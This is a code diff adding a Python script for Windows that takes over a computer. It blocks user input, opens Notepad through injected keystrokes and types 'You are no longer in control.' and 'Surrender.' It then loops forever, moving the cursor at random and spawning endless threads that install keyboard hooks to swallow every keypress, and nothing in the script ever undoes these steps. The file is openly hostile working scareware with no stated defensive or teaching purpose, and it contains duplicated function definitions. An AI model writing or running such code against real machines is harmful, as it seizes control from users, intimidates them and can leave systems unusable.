@@ -1,0 +1,196 @@
+from ctypes import wintypes
+import ctypes
+import time
+import random
+import threading
+
+
+SCANCODES = {
+    "A": 0x1E, "B": 0x30, "C": 0x2E, "D": 0x20,
+    "E": 0x12, "F": 0x21, "G": 0x22, "H": 0x23,
+    "I": 0x17, "J": 0x24, "K": 0x25, "L": 0x26,
+    "M": 0x32, "N": 0x31, "O": 0x18, "P": 0x19,
+    "Q": 0x10, "R": 0x13, "S": 0x1F, "T": 0x14,
+    "U": 0x16, "V": 0x2F, "W": 0x11, "X": 0x2D,
+    "Y": 0x15, "Z": 0x2C,
+    "1": 0x02, "2": 0x03, "3": 0x04, "4": 0x05,
+    "5": 0x06, "6": 0x07, "7": 0x08, "8": 0x09,
+    "9": 0x0A, "0": 0x0B,
+    "ENTER": 0x1C,
+    "SPACE": 0x39,
+    "TAB": 0x0F,
+    "ESC": 0x01,
+    "BACKSPACE": 0x0E,
+    "UP": 0x48,
+    "DOWN": 0x50,
+    "LEFT": 0x4B,
+    "RIGHT": 0x4D,
+}
+
+VK_CODES = {
+    "LCTRL": 0xA2,
+    "RCTRL": 0xA3,
+    "LSHIFT": 0xA0,
+    "RSHIFT": 0xA1,
+    "LALT": 0xA4,
+    "RALT": 0xA5,
+    "LWIN": 0x5B,
+    "RWIN": 0x5C,
+    "ENTER": 0x0D,
+    "ESC": 0x1B,
+    "SPACE": 0x20,
+    "TAB": 0x09,
+}
+
+
+
+move_cursor = ctypes.windll.user32.SetCursorPos
+
+PUL = ctypes.POINTER(ctypes.c_ulong)
+
+class KEYBDINPUT(ctypes.Structure):
+    _fields_ = [
+        ("wVk", ctypes.c_ushort),
+        ("wScan", ctypes.c_ushort),
+        ("dwFlags", ctypes.c_ulong),
+        ("time", ctypes.c_ulong),
+        ("dwExtraInfo", PUL),
+    ]
+
+class MOUSEINPUT(ctypes.Structure):
+    _fields_ = [
+        ("dx", ctypes.c_long),
+        ("dy", ctypes.c_long),
+        ("mouseData", ctypes.c_ulong),
+        ("dwFlags", ctypes.c_ulong),
+        ("time", ctypes.c_ulong),
+        ("dwExtraInfo", PUL),
+    ]
+
+class HARDWAREINPUT(ctypes.Structure):
+    _fields_ = [
+        ("uMsg", ctypes.c_ulong),
+        ("wParamL", ctypes.c_short),
+        ("wParamH", ctypes.c_ushort),
+    ]
+
+class INPUT_UNION(ctypes.Union):
+    _fields_ = [
+        ("ki", KEYBDINPUT),
+        ("mi", MOUSEINPUT),
+        ("hi", HARDWAREINPUT),
+    ]
+
+class INPUT(ctypes.Structure):
+    _fields_ = [
+        ("type", ctypes.c_ulong),
+        ("union", INPUT_UNION),
+    ]
+
+INPUT_KEYBOARD = 1
+KEYEVENTF_KEYUP = 0x0002
+KEYEVENTF_SCANCODE = 0x0008
+
+SendInput = ctypes.windll.user32.SendInput
+
+def press_key(scan_code: int):
+    ki = KEYBDINPUT(0, scan_code, KEYEVENTF_SCANCODE, 0, None)
+    x = INPUT(INPUT_KEYBOARD, INPUT_UNION(ki=ki))
+    SendInput(1, ctypes.byref(x), ctypes.sizeof(x))
+
+def release_key(scan_code: int):
+    ki = KEYBDINPUT(0, scan_code, KEYEVENTF_SCANCODE | KEYEVENTF_KEYUP, 0, None)
+    x = INPUT(INPUT_KEYBOARD, INPUT_UNION(ki=ki))
+    SendInput(1, ctypes.byref(x), ctypes.sizeof(x))
+
+def release_key(scan_code, use_vk=False):
+    if use_vk:
+        ki = KEYBDINPUT(scan_code, 0, KEYEVENTF_KEYUP, 0, None)
+    else:
+        ki = KEYBDINPUT(0, scan_code, KEYEVENTF_SCANCODE | KEYEVENTF_KEYUP, 0, None)
+    x = INPUT(INPUT_KEYBOARD, INPUT_UNION(ki=ki))
+    SendInput(1, ctypes.byref(x), ctypes.sizeof(x))
+
+def press_key(scan_code, use_vk=False):
+    if use_vk:
+        ki = KEYBDINPUT(scan_code, 0, 0, 0, None)
+    else:
+        ki = KEYBDINPUT(0, scan_code, KEYEVENTF_SCANCODE, 0, None)
+    x = INPUT(INPUT_KEYBOARD, INPUT_UNION(ki=ki))
+    SendInput(1, ctypes.byref(x), ctypes.sizeof(x))
+
+def type_text(text):
+    for i in range(len(text)):
+        try:
+            if text[i] == " ":
+                press_key(SCANCODES["SPACE"])
+                release_key(SCANCODES["SPACE"])
+            else:
+                press_key(SCANCODES[str(text[i]).upper()])
+                release_key(SCANCODES[str(text[i]).upper()])
+        except:
+            pass
+
+user32 = ctypes.windll.user32
+kernel32 = ctypes.windll.kernel32
+
+WH_KEYBOARD_LL = 13
+WM_KEYDOWN = 0x0100
+
+hook_id = None
+hook_pointer = None
+def _keyboard_proc(nCode, wParam, lParam):
+    if wParam == WM_KEYDOWN:
+        return 1
+    return user32.CallNextHookEx(None, nCode, wParam, lParam)
+
+def ignore_keyboard():
+    global hook_id, hook_pointer
+    hook_pointer = ctypes.WINFUNCTYPE(
+        wintypes.LPARAM, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM
+    )(_keyboard_proc)
+    hook_id = user32.SetWindowsHookExA(
+        WH_KEYBOARD_LL,
+        hook_pointer,
+        kernel32.GetModuleHandleW(None),
+        0
+    )
+    msg = wintypes.MSG()
+    while True:
+        user32.GetMessageA(ctypes.byref(msg), None, 0, 0)
+        user32.TranslateMessage(ctypes.byref(msg))
+        user32.DispatchMessageA(ctypes.byref(msg))
+
+def stop_ignore():
+    global hook_id
+    if hook_id:
+        user32.UnhookWindowsHookEx(hook_id)
+        hook_id = None
+
+if __name__ == "__main__":
+    ctypes.windll.user32.BlockInput(True) # Ignore user input
+    time.sleep(2)
+    press_key(0x5B, use_vk=True)
+    press_key(SCANCODES["R"])
+    release_key(SCANCODES["R"])
+    release_key(0x5B, use_vk=True)
+
+    # Run box opened
+
+    time.sleep(0.3) # let it focus
+    type_text("notepad")
+    press_key(SCANCODES["ENTER"])
+
+    # Notepad opened
+
+    time.sleep(0.5) # let it focus
+    type_text("You are no longer in control.")
+    press_key(SCANCODES["ENTER"])
+    type_text("Surrender.")
+    press_key(SCANCODES["ENTER"])
+    press_key(0x7A, use_vk=True) # F11
+
+    while True:
+        move_cursor(random.choice(range(1,ctypes.windll.user32.GetSystemMetrics(0))), random.choice(range(1,ctypes.windll.user32.GetSystemMetrics(1))))
+        thread = threading.Thread(target=ignore_keyboard, daemon=True)
+        thread.start()
